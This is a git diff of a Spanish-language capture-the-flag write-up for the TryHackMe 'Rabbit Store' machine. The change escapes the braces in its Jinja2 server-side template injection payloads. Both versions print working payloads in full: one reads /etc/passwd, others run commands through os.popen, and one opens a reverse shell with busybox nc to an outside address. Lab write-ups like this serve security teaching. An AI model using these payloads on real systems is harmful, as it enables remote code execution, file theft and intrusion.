@@ -118,7 +118,7 @@ Tras realizar varias pruebas, identificamos que el chatbot es vulnerable a ataqu
 Utilizamos el siguiente *payload* y logramos identificar una ruta interna absoluta y un nombre de usuario:
 ```json
 {
-  "username":"{{ request.__class__.__dict__ }}"
+  "username":"{{ '{{' }} request.__class__.__dict__ {{}}}}"
 }
 ```
 ![](../assets/img/Rabbit_store-tryhackme-writeup/19.png)
@@ -126,7 +126,7 @@ Utilizamos el siguiente *payload* y logramos identificar una ruta interna absolu
 El siguiente *payload* nos permitirá leer ficheros internos, logramos enumerar el fichero passwd, este incluye usuarios relevantes como *Azrael* y *rabbitmq*:
 ```json
 {
-  "username":"{{ request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read() }}"
+  "username":"{{ '{{' }} request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read() {{}}}}"
 }
 ```
 ![](../assets/img/Rabbit_store-tryhackme-writeup/20.png)
@@ -134,7 +134,7 @@ El siguiente *payload* nos permitirá leer ficheros internos, logramos enumerar 
 A continuación, utilizamos el siguiente código para lograr ejecutar código remoto:
 ```json
 {
-  "username":"{{ config.__class__.from_envvar.__globals__.import_string('os').popen('id').read() }}"
+  "username":"{{ '{{' }} config.__class__.from_envvar.__globals__.import_string('os').popen('id').read() {{}}}}"
 }
 ```
 ![](../assets/img/Rabbit_store-tryhackme-writeup/21.png)
@@ -142,7 +142,7 @@ A continuación, utilizamos el siguiente código para lograr ejecutar código re
 Aprovechamos la vulnerabilidad y logramos obtener la flag de usuario:
 ```json
 {
-  "username":"{{ config.__class__.from_envvar.__globals__.import_string('os').popen('cat /home/azrael/user.txt').read() }}"
+  "username":"{{ '{{' }} config.__class__.from_envvar.__globals__.import_string('os').popen('cat /home/azrael/user.txt').read() {{}}}}"
 }
 ```
 ![](../assets/img/Rabbit_store-tryhackme-writeup/22.png)
@@ -151,7 +151,7 @@ Aprovechamos la vulnerabilidad y logramos obtener la flag de usuario:
 A continuación, ponemos un **netcat** a la escucha y ejecutamos el siguiente comando para obtener una reverse shell:
 ```json
 {
-  "username":"{{ config.__class__.from_envvar.__globals__.import_string('os').popen('busybox nc 10.9.4.73 443 -e sh').read() }}"
+  "username":"{{ '{{' }} config.__class__.from_envvar.__globals__.import_string('os').popen('busybox nc 10.9.4.73 443 -e sh').read() {{}}}}"
 }
 ```
 ![](../assets/img/Rabbit_store-tryhackme-writeup/23.png)
